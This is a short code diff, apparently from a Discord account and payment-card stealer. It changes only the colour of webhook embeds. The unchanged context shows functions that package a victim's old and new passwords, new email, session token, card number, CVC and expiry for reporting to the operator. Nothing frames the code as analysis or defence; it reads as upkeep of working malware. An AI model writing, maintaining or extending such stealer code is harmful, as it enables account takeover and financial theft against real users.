@@ -187,7 +187,7 @@ function ChangePassword(oldpassword, newpassword, token) {
             avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 16119101,
                     "fields": [
                         {
                             "name": "**Password Changed**",
@@ -234,7 +234,7 @@ function ChangeEmail(newemail, password, token) {
             avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 16119101,
                     "fields": [
                         {
                             "name": "**Email Changed**",
@@ -281,7 +281,7 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
             avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": 16119101,
                     "fields": [
                         {
                             "name": "**Credit Card Added**",
